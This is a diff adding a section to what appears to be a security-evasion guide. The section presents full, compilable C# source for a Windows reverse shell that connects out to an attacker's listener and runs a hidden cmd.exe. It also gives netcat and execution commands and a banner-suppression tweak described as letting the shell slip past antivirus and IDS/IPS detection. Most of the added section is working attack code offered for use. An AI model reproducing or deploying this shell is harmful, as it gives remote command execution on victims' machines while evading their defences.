@@ -589,3 +589,99 @@ catch
    Write-Output "[-] Failed to create output file."
 }
 ```
+
+## >> C# Reverse Shell
+
+This exsmple modifies already-published reverse shell code written in C# to slip past IDS/IPS.  The source script was taken from:
+
+`https://github.com/carlospolop/hacktricks/blob/master/windows/av-bypass.md#compiling-our-own-reverse-shell`
+
+The following modifications were made:<br />
+1. Suppress banner to evade AV network detection (e.g. SEP Firewall IPS)
+2. Added kill command to close the reverse shell
+
+The example source file is called `rs.cs`, compile like this `csc.exe /out:rs.exe rs.cs`
+
+Start a netcat listener on the receiver, for example `nc -nlvp 4444` then execute on the target `rs.exe 192.168.1.242 4444`
+
+This is the modified code, `rs.cs`<br />
+```csharp
+using System;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+namespace ConnectBack
+{
+   public class Program
+   {
+      static StreamWriter streamWriter;
+      public static void Main(string[] args)
+      {
+         using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
+         {
+            using(Stream stream = client.GetStream())
+            {
+               using(StreamReader rdr = new StreamReader(stream))
+               {
+                  streamWriter = new StreamWriter(stream);
+                  StringBuilder strInput = new StringBuilder();
+                  Process p = new Process();
+                  p.StartInfo.FileName = "cmd.exe";
+                  p.StartInfo.CreateNoWindow = true;
+                  p.StartInfo.UseShellExecute = false;
+                  p.StartInfo.RedirectStandardOutput = true;
+                  p.StartInfo.RedirectStandardInput = true;
+                  p.StartInfo.RedirectStandardError = true;
+                  p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                  p.Start();
+                  p.BeginOutputReadLine();
+                  while(true)
+                  {
+                     strInput.Append(rdr.ReadLine());
+                     //strInput.Append("\n");
+                     // Added kill command to close the reverse shell
+                     if(strInput.ToString().Contains("KILLME"))
+                     {
+                        System.Environment.Exit(0);
+                     }
+                     p.StandardInput.WriteLine(strInput);
+                     strInput.Remove(0, strInput.Length);
+                  }
+               }
+            }
+         }
+      }
+      private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+      {
+         StringBuilder strOutput = new StringBuilder();
+         if (!String.IsNullOrEmpty(outLine.Data))
+         {
+            // Suppress banner to evade AV network detection (e.g. SEP Firewall IPS)
+            if(!outLine.Data.Contains("Microsoft Windows [Version") && !outLine.Data.Contains("Microsoft Corporation. All rights reserved"))
+            {
+               try
+               {
+                  strOutput.Append(outLine.Data);
+                  streamWriter.WriteLine(strOutput);
+                  streamWriter.Flush();
+               }
+               catch (Exception err) { }
+            }
+         }
+      }
+   }
+}
+```
+
+Without the modifications, AV will block the connection.<br />
+![alt text](https://github.com/billchaison/evasion/blob/master/rs00.png)
+
+Your reverse shell will not complete.<br />
+![alt text](https://github.com/billchaison/evasion/blob/master/rs01.png)
+
+With the modifications, your reverse shell will slip past IDS/IPS.<br />
+![alt text](https://github.com/billchaison/evasion/blob/master/rs02.png)
